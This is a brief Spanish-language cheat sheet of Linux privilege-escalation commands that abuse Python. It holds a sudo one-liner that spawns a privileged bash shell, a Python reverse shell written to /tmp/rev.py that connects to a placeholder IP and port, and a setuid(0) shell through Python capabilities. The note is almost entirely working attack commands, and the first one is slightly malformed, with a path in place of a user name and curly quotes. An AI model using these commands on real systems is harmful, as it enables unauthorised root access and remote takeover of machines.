## Nota: revisar: /usr/lib/python3 y /usr/bin/python3 

Para escalar a root :

```bash
 sudo -u /usr/bin/python3.8 -c ‘import os; os.execl(”/bin/bash”, “bash”, “-p”)’
```

Para escalar a usuario :

```bash
 echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' > /tmp/rev.py
```

```bash
sudo -u USER /usr/bin/python3 /tmp/rev.py
```

Cuando python tiene capabillites (checar con getcap) :

```bash
RUTA_DE_GETCAP/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
